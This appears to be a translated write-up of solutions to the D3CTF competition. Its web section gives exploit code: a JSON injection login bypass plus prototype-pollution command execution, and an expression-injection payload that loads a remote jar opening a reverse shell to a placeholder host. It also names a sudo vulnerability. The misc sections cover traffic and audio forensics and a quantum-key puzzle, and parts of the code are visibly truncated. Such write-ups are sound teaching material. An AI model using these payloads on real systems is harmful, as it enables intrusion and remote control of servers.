# D3CTF wp By ez_team
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Web
###  8bithub
json sql注入 登录admin账号
    {"username":"admin","password":{"password":1}}
服务端使用`sendmailer`包发邮件，通过调试可以进行原型链污染实现RCE
Exp如下
    import requests as r
    tmp = r.post('http://7281fd0fb4.8bit-pub.d3ctf.io/user/signin',json={"username":"admin","password":{"password":1}}, verify=False)
    print(tmp.text)
    data = {
        "constructor.prototype.args": ["-c", "/readflag > '/tmp/.asd'"],
        "constructor.prototype.path": "/bin/sh",
        "constructor.prototype.sendmail": ["1"],
        "subject": "1",
        "text": "1",
        "to": "PI:EMAIL"
    }
    res = r.post('http://7281fd0fb4.8bit-pub.d3ctf.io/admin/email', cookies=tmp.cookies, json=data, verify=False)
    print(res.text)
    data = {
        "subject": "1",
        "text": "1",
        "to": "PI:EMAIL",
        "attachments":{
            "path":"/tmp/.asd"
        }
    }
    res = r.post('http://7281fd0fb4.8bit-pub.d3ctf.io/admin/email', cookies=tmp.cookies, json=data, verify=False)
    print(res.text)
###  Happy_Valentine’s_Day
在/love 里面传了一个name一个password  
发现name会将参数传进去
    Preview -->
所以有漏洞的页面就是`/1nt3na1_pr3v13w`  
FUZZ一下发现  
name参数为[[${12*12}]]  
在/1nt3na1_pr3v13w可以输出为144  
所以可以确实是spel注入  
之后有一个waf  
]]前加上换行就可以绕过  
下方java打包成jar  
love传POST
    name=[[${new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://xxx/Cmd.jar")}).loadClass("Cmd").getConstructor().newInstance().toString()}
    ]]
之后访问/1nt3na1_pr3v13w即可反弹shell
    import java.io.*;
    import java.util.*;
    public class Cmd {
        String res;
        public Cmd() {
            try {
                File dir = new File("/");
                String[] children = dir.list();
                if (children == null) {
                } else {
                    for (int i = 0; i & /dev/tcp/xxxx/9999 0>&1'";
                String[] cmdstr = { "/bin/sh", "-c", cmd };
                Runtime.getRuntime().exec(cmdstr);
                Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxxx/9999 0>&1");
            } catch (IOException e) {
                res += e.toString();
            }
        }
        @Override
        public String toString() {
            return res;
        }
    }
连进去发现没有权限  
打包成tar  
放到vps上之后将
CVE-2021-3156
    Sudoedit -s /
    存在可利用sudo漏洞的报错
## Misc
###  Robust
首先拿到流量包 发现为QUIC协议，一种udp协议（更加稳定）。  
既然给了SSlkey.log首先就是进行解包。  
可以得到http3 协议的包文件。  
可以导出流查看，发现是每差值为4进行一个流的传递。
这个包传递了一个html，然后下面的包传递了m3u8 是一种
    标签用于指定 m3u8 文件的全局参数或在其后面的切片文件/媒体播放列表的一些信息
可以发现音频共被切片成 17份，而第16个包。
通过搜索发现，此应为数据中的enc.key.加密方法是aes-128-cbc  
那么密钥应该是32个的16进制字符。  
在放出Hint前一直被蛊惑，后来意识到应该是左边的16进制数据。  
但是后面的ts文件比较特殊，headers需要被去掉。有的末尾有SegmentFault也要去掉。  
通过追踪流提取原始数据来提取。  
以0.ts为例  
从这个包的data段开始
这个包的data段结束
即可提取出所有的ts文件  
随后利用 openssl解密所有的ts文件。
    import os
    for i in range(0,17):
        os.system("openssl aes-128-cbc -d -in {}.ts -out audit{}.ts -nosalt -iv 00000000000000000000000000000000 -K 34363238656561363031396632323631".format(i,i))
可以得到完整的音频，这里题目作者给出了提示modem解调，还给了一个github链接，里面第一个就提到了quiet工具。我们通过查看频谱也发现，高频段有人耳听不见的数据。  
https://github.com/quiet/quiet。  
我们也尝试了quiet-js，但是没有效果，且使用比较受限，容错率低，于是就老老实实部署编译quiet。  
主要的部署脚本在，跟着一步一步复制粘贴就能得到可以解题的”quiet_decode_file”可执行文件。最后多个配置尝试下来，用的是ultrasonic配置才解开。具体命令(首先要将提出来的wav重命名为encoded.wav)：`quiet_decode_file
ultrasonic flag.file`  
通过这个工具可以成功解调频 得到 flag.file  
经过cyberchef自动识别，可以发现是一个zip.  
zip里面给出了 信息， 网易云音乐， 音乐id以及歌词json 。  
可以想到明文攻击，通过明文攻击可以打开压缩包。  
发现另一个txt是一个 中国的galgame的剧本。  
用010可以发现其中有读不到的空白字符。想到零宽度隐写。
然后base85一把梭
###  easyQuantum
是一个类量子加密通讯。  
可以通过如下的这个链接来学习  
从中我们可以得知。只要测量基一样。那么这个密钥就是被确定的。  
流量包里的数据都是pickle序列化过的。  
那么除了流量中的过短数据 需要抛出当前段和上一段数据外。  
以及第一段数据声明了密钥长度。  
结尾给出了密文。 可知是亦或加密的。  
那么除此之外其他数据均为3个一组。进行比对而后取得密钥串。  
通过查看流量，有序列化的痕迹，换了各种版本的python与各种包，最后确定是python3的pickle序列化，且用了numpy的库，所以说，第一步要反序列化，接下来再考虑量子通信计算。  
为了方便操作，我把四种状态换成了字母进行处理。下面是我的脚本。
    import pickle
    import numpy
    # [0,1] -> |0> -> w 
    # [1,0] -> |1> -> s
    # [+,-] -> |0> + |1> -> a
    # [+,+] -> |0> - |1> -> d
    # 0 0 -> |0>       -> w 
    # 0 1 -> |1>       -> s
    # 1 0 -> |0> + |1> -> a
    # 1 1 -> |0> - |1> -> d
    name = "src_50000.txt"
    content = open(name).read()
    content = content.strip()
    content = content.split("\n")
    Q = []
    Q_fin = []
    ali = []
    bob = []
    bob_fin = []
    def QTrans(ll):
        tmp = []
        for l in ll:
            if l[0] == 0 and l[1] == 1:
                tmp.append("w")
                continue
            if l[0] == 1 and l[1] == 0:
                tmp.append("s")
                continue
            if l[1]  0:
                tmp.append("d")
                continue
        Q_fin.append(tmp)
    for i in content:
        a = (pickle.loads(bytes.fromhex(i)))
        if type(a) == list and type(a[0]) == numpy.ndarray: # Quantum
            QTrans(a)
        else:
            ali.append(a)
    print(ali[-1])
    name = "src_52926.txt"
    content = open(name).read()
    content = content.strip()
    content = content.split("\n")
    for i in content:
        a = (pickle.loads(bytes.fromhex(i)))
        bob.append(a)
    for i in range(len(Q_fin)):
        if not type(bob[i]) == str:
            Q.append(Q_fin[i])
            bob_fin.append(bob[i])
    ali = ali[1:-1]
    for i in range(len(Q)):
        print("Alice:",ali[i],"Q",Q[i],"Bob",bob_fin[i])
    # [0,1] -> |0> -> w 
    # [1,0] -> |1> -> s
    # [+,-] -> |0> + |1> -> a
    # [+,+] -> |0> - |1> -> d
    # 0 0 -> |0>       -> w 
    # 0 1 -> |1>       -> s
    # 1 0 -> |0> + |1> -> a
    # 1 1 -> |0> - |1> -> d
    key = []
    def keyGen():
        for i in range(len(ali)):
            for j in range(4):
                # print(Q[i][j],bob_fin[i][j],ali[i][j])
                if Q[i][j] == "w" and bob_fin[i][j] == 0:
                    key.append(0)
                if Q[i][j] == "s" and bob_fin[i][j] == 0:
                    key.append(1)  
                if Q[i][j] == "a" and bob_fin[i][j] == 1:
                    key.append(0)
                if Q[i][j] == "d" and bob_fin[i][j] == 1:
                    key.append(1)
    keyGen()
这里的key最后要取反再异或后面那个十六进制，反正我也没整明白到底是咋回事，能整出flag就完事了hhhh
###  SignIn
Tg群。
###  Virtual Love
Strings 一把梭
###  Virtual Love Revenge
可以机灵的发现原来flag的地方变成了压缩包密码